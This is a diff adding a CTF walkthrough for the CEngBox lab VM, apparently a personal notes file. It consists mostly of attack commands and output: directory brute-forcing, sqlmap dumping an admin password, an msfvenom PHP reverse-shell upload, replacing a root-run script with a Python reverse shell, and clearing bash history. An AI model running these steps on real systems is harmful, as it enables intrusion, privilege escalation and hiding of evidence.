@@ -227,8 +227,149 @@ root@LazySysAdmin:~# cat proof.txt
 
 optional:
 
-root@LazySysAdmin:~# cat /dev/null > ~/.bash_history && history -c && exit     
+root@LazySysAdmin:~# cat /dev/null > ~/.bash_history && history -c     
 (history cleared completely)
+
+####################################################################################################################################################
+
+CEngBox walkthrough
+
+LEVEL:  EASY
+
+
+1 - nmap -sS -T4 -Pn -A -p- 192.168.43.168
+
+(nothing usefull!)
+
+2 - dirb http://192.168.43.168 -r
+
+(nothing usefull!)
+
+
+3 - focusing on webpage and deeply scanning:
+
+on webpage: cengover@cengbox.com user: cengover 
+
+- dirb http://192.168.43.168 /usr/share/dirb/wordlists/big.txt
+
+==> DIRECTORY: http://192.168.43.168/masteradmin/                              
+
+- dirb http://192.168.43.168/masteradmin /usr/share/dirb/wordlists/common.txt  -X .php -r
+
+---- Scanning URL: http://192.168.43.168/masteradmin/ ----
++ http://192.168.43.168/masteradmin/db.php (CODE:200|SIZE:0)                                                                                                                                 
++ http://192.168.43.168/masteradmin/login.php (CODE:200|SIZE:5137)                                                                                                                           
++ http://192.168.43.168/masteradmin/upload.php (CODE:200|SIZE:1440)                                                                                                                          
+                                                                     
+
+4 - in http://192.168.43.168/masteradmin/login.php we test login form for any possible SQL injection:
+
+- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms --dbs --batch
+
+available databases [5]:
+[*] cengbox
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+
+- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms -D cengbox  --dump-all --batch
+
+Database: cengbox
+Table: admin
+[1 entry]
++----+---------------+-------------+
+| id | password      | username    |
++----+---------------+-------------+
+| 1  | C3ng0v3R00T1! | masteradmin |
++----+---------------+-------------+
+
+5 -  then we login to upload page
+
+NOTE: extension not allowed, please choose a CENG file
+
+-  msfvenom -p msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.43.250 LPORT=445 -f raw > shell.php
+
+-  mv shell.php shell.php.ceng
+
+- curl  http://192.168.43.168/uploads/shell.php.ceng 
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.43.250:445 
+[*] Sending stage (39282 bytes) to 192.168.43.168
+[*] Meterpreter session 1 opened (192.168.43.250:445 -> 192.168.43.168:38520) at 2020-11-16 14:52:27 +0330
+
+meterpreter > sysinfo
+Computer    : cengbox
+OS          : Linux cengbox 4.4.0-177-generic #207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64
+Meterpreter : php/linux
+meterpreter > 
+Server username: www-data (33)
+meterpreter> shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+www-data@cengbox:/var/www/html/uploads$ su cengover
+Password: C3ng0v3R00T1!
+
+cengover@cengbox:/$ 
+user proof in /home:  8f7f6471e2e869f029a75c5de601d5e0
+
+
+
+6 - ps aux | grep root
+
+
+root      2299  0.0  0.0   4500   748 ?        Ss   15:34   0:00 /bin/sh -c /usr/bin/python3 /opt/md5check.py
+
+
+>>>> we replace python2 reverse shell on md5check.py which has its own root access process :
+
+
+cengover@cengbox:/opt$ echo 'import socket' > md5check.py
+
+cengover@cengbox:/opt$ echo 'import subprocess' >> md5check.py
+
+cengover@cengbox:/opt$ echo import os >> md5check.py
+
+cengover@cengbox:/opt$ echo 's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> md5check.py
+
+cengover@cengbox:/opt$ echo 's.connect(("192.168.43.250",4444))' >> md5check.py
+
+cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 0)' >> md5check.py
+
+cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 1)' >> md5check.py
+
+cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 2)' >> md5check.py
+
+cengover@cengbox:/opt$ echo 'p=subprocess.call(["/bin/bash", "-i"])' >> md5check.py
+
+
+7 - nc -nvlp 4444
+
+root@cengbox:~# cat root.txt
+cat root.txt
+ / ____|  ____|           |  _ \           
+| |    | |__   _ __   __ _| |_) | _____  __
+| |    |  __| | '_ \ / _` |  _ < / _ \ \/ /
+| |____| |____| | | | (_| | |_) | (_) >  < 
+ \_____|______|_| |_|\__, |____/ \___/_/\_\
+                      __/ |                
+                     |___/                 
+
+Congrats. Hope you enjoyed it and you can contact me on Twitter @arslanblcn_
+
+a51e522b22a439b8e1b22d84f71cf0f2
+
+------> clear history :
+
+cengover@cengbox:/opt$ cat /dev/null > ~/.bash_history && history -c 
+
+and
+
+root@cengbox:~# cat /dev/null > ~/.bash_history && history -c
 
 ####################################################################################################################################################
 
